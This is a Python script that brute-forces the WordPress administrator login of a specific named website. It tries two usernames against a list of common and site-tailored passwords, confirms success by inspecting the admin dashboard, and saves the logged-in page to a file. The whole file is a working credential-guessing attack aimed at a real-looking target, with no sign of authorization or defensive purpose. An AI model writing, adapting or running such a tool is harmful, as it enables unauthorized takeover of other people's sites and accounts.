#!/usr/bin/env python3
"""augmind.me WP brute - strict verification (cookie + dashboard)"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "https://augmind.me"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

PWS = ["admin", "admin123", "123456", "admin888", "augmind", "augmind123", "12345678",
       "a123456", "admin@123", "password", "admin123456", "888888", "admin666", "123456789",
       "Aa123456", "augmind2024", "metaverse", "blockchain", "ar123456", "vr123456"]

for user in ["admin", "augmind"]:
    for pw in PWS:
        op = get_opener()
        try:
            code, final, body = fetch(op, HOST + "/wp-login.php")
            data = urllib.parse.urlencode({"log": user, "pwd": pw, "wp-submit": "Log In",
                                           "redirect_to": HOST + "/wp-admin/", "testcookie": "1"})
            code, final, body = fetch(op, HOST + "/wp-login.php", data=data)
            code3, final3, body3 = fetch(op, HOST + "/wp-admin/")
            logged_in = "user_login" not in body3 and ("dashboard" in body3.lower() or "wp-admin-bar" in body3 or "wp-admin/css" in body3)
            if logged_in:
                print("!!! HIT %s/%s" % (user, pw), flush=True)
                open("/tmp/augmind_hit.html", "w").write(body3)
                raise SystemExit
        except SystemExit:
            raise
        except Exception:
            continue
    print("  %s done" % user, flush=True)
print("[done] no hit", flush=True)
